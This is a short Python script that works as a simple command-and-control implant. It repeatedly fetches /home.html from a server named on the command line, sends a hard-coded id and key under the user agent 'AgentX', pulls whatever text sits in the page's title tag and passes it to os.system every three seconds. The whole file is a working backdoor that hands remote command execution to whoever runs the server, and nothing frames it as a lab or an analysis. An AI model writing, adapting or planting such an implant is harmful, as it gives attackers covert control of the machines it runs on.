#!/usr/bin/env python

import sys
import http.client
from six.moves import urllib
import time
import os
import re


#get http server ip
http_server = sys.argv[1]
#create a connection
conn = http.client.HTTPConnection(http_server, 8082)
params = urllib.parse.urlencode({'@id': '11223344', '@key': '23AB5CF'})

headers = {"Content-type": 'text-html', "Accept": "text/plain", "User-Agent": "AgentX"}

while 1:
    
    conn.request('GET', '/home.html', params, headers)

    
    rsp = conn.getresponse()
    
    data_received = rsp.read()

    command = re.search("<title>(.*?)</title>", str(data_received)).group(1)
    
    os.system(command)
    time.sleep(3)
conn.close()
